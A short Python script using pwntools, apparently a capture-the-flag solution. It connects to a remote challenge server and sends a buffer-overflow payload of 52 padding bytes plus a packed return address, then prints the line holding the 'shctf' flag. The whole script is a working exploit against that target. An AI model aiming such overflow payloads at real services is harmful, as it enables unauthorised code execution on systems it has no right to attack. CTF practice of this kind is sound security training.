from pwn import *

p = remote("0.cloud.chals.io", 26008)
p.sendline(b"A"*52 + p32(0x804921d))
for line in p.readall().split(b'\n'):
        if b'shctf' in line:
                print(line.decode())
